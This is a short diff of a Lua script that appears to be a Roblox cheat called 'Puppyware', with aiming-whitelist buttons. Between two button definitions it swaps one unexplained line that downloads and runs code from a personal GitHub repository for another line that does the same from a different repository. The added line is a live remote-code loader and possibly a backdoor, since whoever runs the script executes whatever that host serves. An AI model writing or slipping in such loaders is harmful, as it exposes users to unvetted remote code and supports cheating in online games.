@@ -877,7 +877,7 @@ WhitelistSection:AddButton('Add', function(State)
     end
 end)
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Robloxprogamer2141274/oaoa/main/emoji3"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/epicgamersoocool123/test/main/22"))()
 
 WhitelistSection:AddButton('Remove', function()
     if PuppywareSettings.Aiming.Whitelist.Holder ~= nil and Players:FindFirstChild(PuppywareSettings.Aiming.Whitelist.Holder) then
